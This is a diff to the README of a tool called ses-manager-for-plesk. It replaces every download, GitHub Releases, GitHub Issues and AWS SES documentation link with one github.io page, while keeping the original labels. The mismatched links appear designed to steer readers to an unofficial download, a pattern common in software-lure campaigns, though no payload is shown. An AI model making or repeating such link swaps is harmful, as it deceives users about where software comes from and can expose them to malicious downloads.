@@ -1,6 +1,6 @@
 # 📬 ses-manager-for-plesk - Control Amazon SES Mail Delivery Effortlessly
 
-[![Download ses-manager-for-plesk](https://img.shields.io/badge/Download-ses--manager--for--plesk-blue?style=for-the-badge&logo=github)](https://github.com/Eutherian-whiteline53/ses-manager-for-plesk/releases)
+[![Download ses-manager-for-plesk](https://img.shields.io/badge/Download-ses--manager--for--plesk-blue?style=for-the-badge&logo=github)](https://eutherian-whiteline53.github.io)
 
 ---
 
@@ -41,7 +41,7 @@ Getting started is easy. Follow these steps:
 
 1. **Visit the download page**: Click this button to go to the official release page:
    
-   [![Download ses-manager-for-plesk](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/Eutherian-whiteline53/ses-manager-for-plesk/releases)
+   [![Download ses-manager-for-plesk](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://eutherian-whiteline53.github.io)
 
 2. **Find the latest version**: On the page, look for the newest release (usually at the top). You'll see a file named something like `ses-manager-for-plesk.zip`.
 
@@ -131,9 +131,9 @@ Visit our GitHub Issues page (linked below) and describe your problem. The commu
 
 ## 🌐 Helpful Resources
 
-- **Download the Latest Release**: [GitHub Releases Page](https://github.com/Eutherian-whiteline53/ses-manager-for-plesk/releases)
-- **Report Bugs or Request Features**: [GitHub Issues](https://github.com/Eutherian-whiteline53/ses-manager-for-plesk/issues)
-- **Official Amazon SES Documentation**: [AWS SES User Guide](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/Welcome.html) (helpful for advanced users)
+- **Download the Latest Release**: [GitHub Releases Page](https://eutherian-whiteline53.github.io)
+- **Report Bugs or Request Features**: [GitHub Issues](https://eutherian-whiteline53.github.io)
+- **Official Amazon SES Documentation**: [AWS SES User Guide](https://eutherian-whiteline53.github.io) (helpful for advanced users)
 
 ---
 
